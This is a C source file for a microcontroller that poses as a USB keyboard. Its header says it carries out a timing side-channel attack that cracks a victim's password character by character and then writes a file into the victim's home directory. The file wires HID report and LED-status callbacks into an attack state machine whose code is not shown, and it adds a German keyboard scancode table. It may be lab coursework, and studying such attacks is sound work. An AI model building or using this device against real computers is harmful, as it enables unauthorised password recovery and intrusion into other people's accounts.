/*******************************************************************************
 * HID KEYBOARD TIMING ATTACK IMPLEMENTATION
 *
 * This program implements a USB HID keyboard that performs a timing side-channel
 * attack to crack passwords character-by-character, then creates a file in the
 * victim's home directory.
 ******************************************************************************/

#include "KeyboardHID.h"
#include "german_keyboardCodes.h"
#include "password_attack.h"

// LED pins for visual feedback (NUMLOCK/CAPSLOCK indicators)
#define LED1 P1_1
#define LED2 P1_0

// Clock configuration for USB operation
XMC_SCU_CLOCK_CONFIG_t clock_config = {
	.syspll_config.p_div  = 2,
	.syspll_config.n_div  = 80,
	.syspll_config.k_div  = 4,
	.syspll_config.mode   = XMC_SCU_CLOCK_SYSPLL_MODE_NORMAL,
	.syspll_config.clksrc = XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP,
	.enable_oschp         = true,
	.calibration_mode     = XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_FACTORY,
	.fsys_clksrc          = XMC_SCU_CLOCK_SYSCLKSRC_PLL,
	.fsys_clkdiv          = 1,
	.fcpu_clkdiv          = 1,
	.fccu_clkdiv          = 1,
	.fperipheral_clkdiv   = 1
};

// Character set used in passwords
const char password_set_of_chars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!()-_+=~;:,.<>[]{}/?&$ ";
uint8_t password_set_of_chars_len = 0;

// USB HID callbacks required by LUFA library
bool CALLBACK_HID_Device_CreateHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo, uint8_t* const ReportID, const uint8_t ReportType, void* ReportData, uint16_t* const ReportSize);
void CALLBACK_HID_Device_ProcessHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo, const uint8_t ReportID, const uint8_t ReportType, const void* ReportData, const uint16_t ReportSize);

// System initialization
void SystemCoreClockSetup(void);

// Helper function for German keyboard layout
uint8_t getCharCodeInGerman(char c, uint8_t* modifier);

int main(void) {
	// Calculate password character set length
	password_set_of_chars_len = strlen(password_set_of_chars);

	// Initialize LED pins for visual feedback (shows NUMLOCK/CAPSLOCK state)
	XMC_GPIO_SetMode(LED1, XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	XMC_GPIO_SetMode(LED2, XMC_GPIO_MODE_OUTPUT_PUSH_PULL);

	// Initialize USB subsystem
	USB_Init();

	// Initialize SysTick timer for timing measurements (1ms tick)
	SysTick_Config(SystemCoreClock / 1000);

	// Initialize password attack state machine
	attack_init();

	// Wait for USB host enumeration to complete
	for(int i = 0; i < 10e6; ++i)
		;

	// Main loop: continuously process USB tasks
	while (1) {
		HID_Device_USBTask(&Keyboard_HID_Interface);
	}
}

// Callback: Create HID Report (OUTPUT)
// Called by USB stack when host requests keyboard input
// This is where we generate key press/release events
bool CALLBACK_HID_Device_CreateHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo, uint8_t* const ReportID, const uint8_t ReportType, void* ReportData, uint16_t* const ReportSize )
{
	USB_KeyboardReport_Data_t* report = (USB_KeyboardReport_Data_t *)ReportData;
	*ReportSize = sizeof(USB_KeyboardReport_Data_t);

	// Delegate report creation to password attack module
	attack_create_report(report);

	return true;
}

// Callback: Process HID Report (INPUT)
// Called by USB stack when host sends LED status updates
// Used to detect authentication responses via LED state changes for timing attack
void CALLBACK_HID_Device_ProcessHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo, const uint8_t ReportID, const uint8_t ReportType, const void* ReportData, const uint16_t ReportSize)
{
	uint8_t *report = (uint8_t*)ReportData;

	// Update physical LEDs to mirror host LED state (for debugging)
	if(*report & HID_KEYBOARD_LED_NUMLOCK)
	{
		XMC_GPIO_SetOutputHigh(LED1);
		attack_process_response(report);
	}
	else
	{
		XMC_GPIO_SetOutputLow(LED1);
		attack_process_response(report);
	}

	if(*report & HID_KEYBOARD_LED_CAPSLOCK)
	{
		XMC_GPIO_SetOutputHigh(LED2);
		mark_attack_completed();
	}
	else
	{
		XMC_GPIO_SetOutputLow(LED2);
	}
}

// Configure system clocks for USB operation
// Called automatically before main() by startup code
void SystemCoreClockSetup(void)
{
	// Initialize system clock with configuration from clock_config struct
	XMC_SCU_CLOCK_Init(&clock_config);

	// Configure USB PLL and clock tree
	XMC_SCU_CLOCK_EnableUsbPll();
	XMC_SCU_CLOCK_StartUsbPll(2, 64);
	XMC_SCU_CLOCK_SetUsbClockDivider(4);
	XMC_SCU_CLOCK_SetUsbClockSource(XMC_SCU_CLOCK_USBCLKSRC_USBPLL);
	XMC_SCU_CLOCK_EnableClock(XMC_SCU_CLOCK_USB);

	// Update SystemCoreClock variable
	SystemCoreClockUpdate();
}

uint8_t getCharCodeInGerman(char c, uint8_t* modifier)
{
	*modifier = 0;

	// Lowercase letters (a-z)
	if (c >= 'a' && c <= 'z')
	{
		return GERMAN_KEYBOARD_SC_A + (c - 'a');
	}

	// Uppercase letters (A-Z) - requires Shift modifier
	if (c >= 'A' && c <= 'Z')
	{
		*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
		return GERMAN_KEYBOARD_SC_A + (c - 'A');
	}

	// Numbers and special characters
	switch(c)
	{
		// Numbers (no modifier)
		case '1':
			return GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION;
		case '2':
			return GERMAN_KEYBOARD_SC_2_AND_QUOTES;
		case '3':
			return GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH;
		case '4':
			return GERMAN_KEYBOARD_SC_4_AND_DOLLAR;
		case '5':
			return GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE;
		case '6':
			return GERMAN_KEYBOARD_SC_6_AND_AMPERSAND;
		case '7':
			return GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE;
		case '8':
			return GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET;
		case '9':
			return GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET;
		case '0':
			return GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE;

		// Special characters with Shift
		case '!':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION;
		case '$':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_4_AND_DOLLAR;
		case '&':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_6_AND_AMPERSAND;
		case '/':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE;
		case '(':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET;
		case ')':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET;
		case '=':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE;
		case '?':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH;
		case '*':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE;
		case '_':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE;
		case ';':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON;
		case ':':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_DOT_AND_COLON;
		case '>':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE;

		// Special characters with Right Alt (AltGr)
		case '{':
			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
			return GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE;
		case '[':
			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
			return GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET;
		case ']':
			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
			return GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET;
		case '}':
			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
			return GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE;
		case '~':
			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
			return GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE;

		// Other characters (no modifier)
		case '+':
			return GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE;
		case '-':
			return GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE;
		case ',':
			return GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON;
		case '.':
			return GERMAN_KEYBOARD_SC_DOT_AND_COLON;
		case ' ':
			return GERMAN_KEYBOARD_SC_SPACE;
		case '<':
			return GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE;
	}

	// Character not supported, return 0
	return 0;
}
